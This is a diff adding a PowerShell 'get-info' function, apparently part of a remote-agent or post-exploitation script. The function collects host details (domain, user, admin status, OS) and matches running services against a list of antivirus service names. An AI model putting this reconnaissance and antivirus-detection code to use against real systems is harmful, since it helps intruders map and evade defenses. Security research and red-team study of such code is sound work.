@@ -120,6 +120,70 @@ function set-sysname {
 	return $sysname
 }
 
+function get-info  {
+
+        $domain = $env:UserDomain
+        $LogOnServer = $env:LogOnServer
+        $userName = $env:UserName
+        $machineName = $env:ComputerName
+
+        $OS = (gwmi Win32_OperatingSystem).caption
+        $SysDescription = (gwmi Win32_OperatingSystem).description
+        $IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
+        $PsVersion = $PSVersionTable.PSVersion.Major
+
+	# Create table of AV software
+	$avServices = @{"symantec" = "Symantec"; 
+		"navapsvc" = "Norton";
+		"mcshield" = "McAfee"; 
+		"windefend" = "Windows Defender";
+		"savservice" = "Sophos";
+		"avp" = "Kaspersky";
+		"SBAMSvc" = "Vipre";
+		"avast!" = "Avast";
+		"fsma" = "F-Secure";
+		"antivirservice" = "AntiVir";
+		"avguard" = "Avira";
+		"fpavserver" = "F-Protect";
+		"pshost" = "Panda Security";
+		"pavsrv" = "Panda AntiVirus";
+		"bdss" = "BitDefender";
+		"avkproxy" = "G_Data AntiVirus";
+		"klblmain" = "Kaspersky Lab AntiVirus";
+		"vbservprof" = "Symantec VirusBlast";
+		"ekrn" = "ESET";
+		"abmainsv" = "ArcaBit/ArcaVir";
+		"ikarus-guardx" = "IKARUS";
+		"clamav" = "ClamAV";
+		"aveservice" = "Avast";
+		"immunetprotect" = "Immunet";
+		"msmpsvc" = "Microsoft Security Essentials";
+		"msmpeng" = "Microsoft Security Essentials";
+	}
+	
+	# generate summary of client
+        $summary  = "============[ System Summary ]==============`n"
+        $summary += "Domain       : $domain`n"
+        $summary += "LogOn Server : $LogOnServer`n"
+        $summary += "User Name    : $userName`n"
+        $summary += "ComputerName : $machineName`n"
+        $summary += "Admin        : $IsAdmin`n"
+	$summary += "PS version   : $PsVersion`n"
+        $summary += "OS version   : $OS`n"
+	$summary += "Description  : $SysDescription`n"
+	$summary += "======[ Detected Antivirus Services ]=======`n"
+
+	# get current services
+	$services = (gwmi win32_service).name
+
+	foreach ($S in $avServices.GetEnumerator()) {			
+		if ( $services -match $($S.Name) ) { $summary += "$($S.Name): $($S.Value)`n" }
+	}
+
+	write-output $summary	
+
+}
+
 function base64url-encode {
 
 	param($rawstring)
